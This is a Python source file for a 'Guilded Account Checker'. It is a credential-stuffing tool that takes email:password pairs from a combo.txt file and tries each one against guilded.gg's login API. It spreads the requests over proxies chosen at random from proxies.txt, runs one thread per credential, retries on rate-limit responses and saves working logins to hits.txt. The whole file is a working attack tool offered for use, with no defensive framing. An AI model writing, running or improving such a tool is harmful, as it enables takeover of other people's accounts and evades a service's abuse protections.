import httpx
import random
import colorama
import os
import time
import threading
from colorama import Fore, Back, Style
from os import system

colorama.init()

if not os.path.exists("proxies.txt"):
    print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}proxies.txt {Fore.LIGHTBLACK_EX}not found{Fore.RESET}")
    with open("proxies.txt", "w") as f:
        f.write("")
    print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] {Fore.LIGHTGREEN_EX}SUCCESS {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}proxies.txt {Fore.LIGHTBLACK_EX}created{Fore.RESET}")
    input(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] Press {Fore.LIGHTBLACK_EX}ENTER {Fore.RESET}to close{Fore.RESET}")
    exit()
if not os.path.exists("combo.txt"):
    print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}combo.txt {Fore.LIGHTBLACK_EX}not found{Fore.RESET}")
    with open("combo.txt", "w") as f:
        f.write("")
    print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] {Fore.LIGHTGREEN_EX}SUCCESS {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}combo.txt {Fore.LIGHTBLACK_EX}created{Fore.RESET}")
    input(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] Press {Fore.LIGHTBLACK_EX}ENTER {Fore.RESET}to close{Fore.RESET}")
    exit()

if len(open("combo.txt").readlines()) == 0:
    print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}combo.txt {Fore.LIGHTBLACK_EX}is empty{Fore.RESET}")
    input(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] Press {Fore.LIGHTBLACK_EX}ENTER {Fore.RESET}to close{Fore.RESET}")
    exit()

if len(open("proxies.txt").readlines()) == 0:
    print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}proxies.txt {Fore.LIGHTBLACK_EX}is empty{Fore.RESET}")
    input(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] Press {Fore.LIGHTBLACK_EX}ENTER {Fore.RESET}to close{Fore.RESET}")
    exit()

HIT = 0
BAD = 0
timeout = 0
print_lock = threading.Lock()



def generate_guilded_account(email, password):
    global HIT
    global BAD
    global timeout

    try:
        login = httpx.post("https://www.guilded.gg/api/login", json={"email": email, "password": password, "getMe": "true"}, proxies=f"http://{random.choice(open('proxies.txt').readlines()).strip()}", timeout=5)
        if login.status_code == 200:
            with print_lock:
                HIT += 1
                os.system(f"title Guilded Account Checker - {HIT} HIT - {BAD} BAD - {timeout} TIMEOUT")
                print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}] {Fore.LIGHTGREEN_EX}LOGIN {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}Email={Fore.RESET}{email} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Password={Fore.RESET}{password} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Status={Fore.RESET}Succesfully{Fore.LIGHTBLACK_EX} | {Fore.LIGHTBLACK_EX}Status Code={Fore.RESET}{login.status_code}{Fore.RESET}")
                with open("hits.txt", "a") as f:
                    f.write(f"{email}:{password}\n")
        elif login.status_code == 429:
            with print_lock:
                timeout += 1
                os.system(f"title Guilded Account Checker - {HIT} HIT - {BAD} BAD - {timeout} TIMEOUT")
                print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}]{Fore.LIGHTYELLOW_EX} LOGIN {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}Email={Fore.RESET}{email} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Password={Fore.RESET}{password} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Status=Timeout{Fore.RESET} | {Fore.LIGHTBLACK_EX}Status Code={Fore.RESET}{login.status_code}{Fore.RESET}")
            return generate_guilded_account(email, password)
        else:
            with print_lock:
                BAD += 1
                os.system(f"title Guilded Account Checker - {HIT} HIT - {BAD} BAD - {timeout} TIMEOUT")
                print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}]{Fore.LIGHTRED_EX} LOGIN {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}Email={Fore.RESET}{email} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Password={Fore.RESET}{password} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Status={Fore.RESET}BAD{Fore.RESET} | {Fore.LIGHTBLACK_EX}Status Code={Fore.RESET}{login.status_code}{Fore.RESET}")
    except Exception as e:
        with print_lock:
            BAD += 1
            os.system(f"title Guilded Account Checker - {HIT} HIT - {BAD} BAD - {timeout} TIMEOUT")
            print(f"{Fore.RESET}[{Fore.LIGHTBLACK_EX}{time.strftime(f'%H{Fore.RESET}:{Fore.LIGHTBLACK_EX}%M{Fore.RESET}:{Fore.LIGHTBLACK_EX}%S')}{Fore.RESET}]{Fore.LIGHTRED_EX} LOGIN {Fore.RESET}➜ {Fore.LIGHTBLACK_EX}Email={Fore.RESET}{email} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Password={Fore.RESET}{password} {Fore.LIGHTBLACK_EX}| {Fore.LIGHTBLACK_EX}Status={Fore.RESET}BAD{Fore.RESET} | {Fore.LIGHTBLACK_EX}Status Code={Fore.RESET}{e}{Fore.RESET}")
        return generate_guilded_account(email, password)

def main():
    with open("combo.txt", "r") as file:
        lines = file.readlines()
        for line in lines:
            email, password = line.strip().split(":")
            thread = threading.Thread(target=generate_guilded_account, args=(email, password))
            thread.start()

if __name__ == "__main__":
    main()

